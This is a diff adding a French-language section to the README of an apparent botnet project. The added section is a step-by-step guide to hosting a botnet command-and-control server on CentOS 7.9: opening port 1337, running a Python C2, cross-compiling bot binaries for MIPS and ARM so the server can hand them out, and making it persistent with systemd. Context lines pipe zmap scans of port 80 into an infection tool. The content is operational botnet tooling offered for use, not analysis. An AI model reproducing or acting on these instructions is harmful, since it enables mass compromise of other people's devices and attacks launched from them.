@@ -94,3 +94,84 @@ Une fois que les bots sont connectés, vous pouvez envoyer les commandes suivant
 # Si vous avez toujours des problèmes avec zmap, essayez de spécifier l'interface
 # sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q -i wlan0 | ./fiber 80"
 # Remplacez wlan0 par votre interface réseau (eth0, wlan0, etc.)
+
+---
+
+## Héberger le serveur C2 et les binaires sur CentOS 7.9
+
+### 1. Installer les dépendances nécessaires
+```bash
+sudo yum update -y
+sudo yum install -y python3 python3-pip git gcc golang zmap screen firewalld
+```
+
+### 2. Démarrer et activer firewalld si ce n'est pas déjà fait
+```bash
+sudo systemctl start firewalld
+sudo systemctl enable firewalld
+```
+
+### 3. Ouvrir le port 1337 sur le firewall
+```bash
+sudo firewall-cmd --permanent --add-port=1337/tcp
+sudo firewall-cmd --reload
+```
+
+### 4. Cloner le dépôt et se placer dans le dossier
+```bash
+git clone https://github.com/wattsans-dc/botnet-c2-catnet.git
+cd botnet-c2-catnet
+```
+
+### 5. Lancer le serveur C2
+```bash
+# En arrière-plan avec screen
+screen -S c2
+python3 simple_c2.py
+# Pour détacher : Ctrl+A puis D
+```
+
+### 6. Compiler les binaires (exemple pour fiber)
+```bash
+go build -o fiber fiber.go
+# Pour cross-compiler (exemple pour MIPS, installez le cross-compiler adapté)
+```
+
+### 7. Héberger les binaires
+Placez tous les binaires (bot.mips, bot.arm, etc.) dans le même dossier que simple_c2.py. Le serveur C2 les distribuera automatiquement.
+
+### 8. Persistance du serveur C2 (systemd)
+Créez un service systemd pour relancer le C2 au démarrage :
+```bash
+sudo nano /etc/systemd/system/c2.service
+```
+Mettez :
+```
+[Unit]
+Description=Botnet C2 Python Server
+After=network.target
+
+[Service]
+Type=simple
+WorkingDirectory=/chemin/vers/botnet-c2-catnet
+ExecStart=/usr/bin/python3 simple_c2.py
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+```
+Puis :
+```bash
+sudo systemctl daemon-reload
+sudo systemctl enable c2.service
+sudo systemctl start c2.service
+```
+
+### 9. Vérifier que le serveur écoute bien
+```bash
+sudo lsof -i :1337
+```
+
+---
+
+**Votre serveur C2 est maintenant prêt à recevoir les connexions des bots et à distribuer les binaires sur CentOS 7.9 !**
